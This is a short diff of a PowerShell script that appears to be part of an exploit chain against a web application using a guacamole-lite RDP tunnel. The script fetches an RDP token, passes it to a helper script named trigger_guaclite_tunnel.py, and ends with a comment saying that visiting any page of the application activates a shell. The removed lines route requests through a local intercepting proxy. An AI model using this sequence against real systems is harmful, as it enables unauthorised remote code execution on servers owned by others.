@@ -58,9 +58,10 @@ $res = Invoke-WebRequest -Uri "http://$machine/token" -method Post -body $json -
 $res_content = ConvertFrom-Json $res.Content
 Write-Output "rdp token: $($res_content.token)
 "
+$status = python trigger_guaclite_tunnel.py --token $res_content.token
+Write-Host "Status: $status"
 
-<# possibly use headless chrome here
-$uri = "http://$machine/rdp?token=" + $res_content.token + "&width=1762&height=694"
-$res1 = Invoke-WebRequest -Uri $uri -SkipHttpErrorCheck -Proxy http://192.168.177.1:8080/
-$res1
+
+<#
+The last part would be to visit any page of the wep application to activate the shell
 #>
